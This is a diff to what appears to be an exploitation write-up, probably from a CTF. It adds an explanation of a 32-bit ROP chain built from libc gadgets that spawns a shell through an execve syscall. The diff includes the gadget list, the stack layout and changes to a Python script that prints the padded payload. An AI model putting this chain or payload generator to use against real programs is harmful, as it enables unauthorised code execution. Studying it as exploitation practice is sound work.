@@ -279,7 +279,49 @@ No surprises there, libc is everpresent! Now we basically just have to find gadg
 
 ### Exploitation
 
-As a first step, I tried to find the exact instructions that I needed but I had no luck.
+As a first step, I tried to find the exact instructions that I needed but I had no luck. So then we need to find instructions that achieve what we want to do, and then fight their sideeffects if any (spoiler alert again: there were). Keep in mind that we also have the stack available for use, so we can inject any data that we are missing or can't find in memory.
+
+I am not going to bore you with the exact process, so here's the final ROP chain:
+
+```arm
+0x1a9e   : pop edx ; ret					                    # setup the stack to contain 0x00 to edx 
+0x3900e  : and al, 8 ; add esp, 0xc ; ret			            # esp skips over our data
+0xc24f7  : push esp ; xor eax, eax ; pop ebx ; pop ebp ; ret	# moving esp to ebx
+0x12acce : dec ebx ; ret 					                    # repeated a few times
+0xcaf24  : add ecx, ebx ; ret					                # set ecx = ebx
+0x97193  : mov eax, 0xb ; int 0x80 				                # syscall
+```
+
+For this to work, we need the input (and by proxy the stack) to look like this:
+
+```
+ ________________ < ebp - 0x4c
+|  padding       |
+ ________________ < ebp
+| 0x1a9e         | <- pop edx ; ret
+ ________________ 
+|\x00\x00\x00\x00| <- this gets loaded into edx, because it can be NULL
+ ________________ 
+| 0x3900e        | <- and al, 8 ; add esp, 0xc ; ret
+ ________________ 
+| /tmp           | <- skip over this (esp + 0x4)
+ ________________ 
+| /sh\x00        | <- skip over this (esp + 0x8)
+ ________________ 
+|\x00\x00\x00\x00| <- skip over this (esp + 0xc)
+ ________________ 
+| 0xc24f7        | <- push esp ; xor eax, eax ; pop ebx ; pop ebp
+ ________________ 
+|\x00\x00\x00\x00| <- this goes onto ebp
+ ________________ 
+| 0x12acce       | <- dec ebx -- repeated 9 times, so that the gadget executes 9 times, used to setup ebx to point to /tmp/sh
+ ________________ 
+| 0xcaf24        | <- make ecx point to \x00\x00\x00\x00 because it needs to be a pointer to NULL
+ ________________ 
+| 0x12acce       | <- dec ebx  -- repeated 7 times, so that the gadget executes 7 times
+ ________________ 
+| 0x97193        | <- mov eax, 0xb ; int 0x80
+```
 
 This is the final exploit that I can up with:
 
@@ -309,7 +351,6 @@ def l(n):
 def p (i):
     return struct.pack('I', i)
 
-bp = p(0x0804824c)
 padding = "A" * 80
 pop_edx = l(0x1a9e)
 NULL="\x00\x00\x00\x00"
@@ -320,8 +361,8 @@ dec_ebx = l(0x12acce)
 add_ecx_ebx = l(0xcaf24)
 set_eax_interrupt = l(0x97193)
 
-fmt = "{0}{1}{2}{3}{4}{5}{6}" + "{8}"*9 + "{10}" + "{8}"*7 +"{9}"
-sys.stdout.write(fmt.format(padding, pop_edx, NULL, add_esp_12, binsh_str, push_esp, NULL, bp, dec_ebx, set_eax_interrupt, add_ecx_ebx).strip())
+fmt = "{0}{1}{2}{3}{4}{5}{2}" + "{6}"*9 + "{8}" + "{6}"*7 +"{7}"
+sys.stdout.write(fmt.format(padding, pop_edx, NULL, add_esp_12, binsh_str, push_esp, dec_ebx, set_eax_interrupt, add_ecx_ebx).strip())
 sys.stdout.flush()
 ```
 
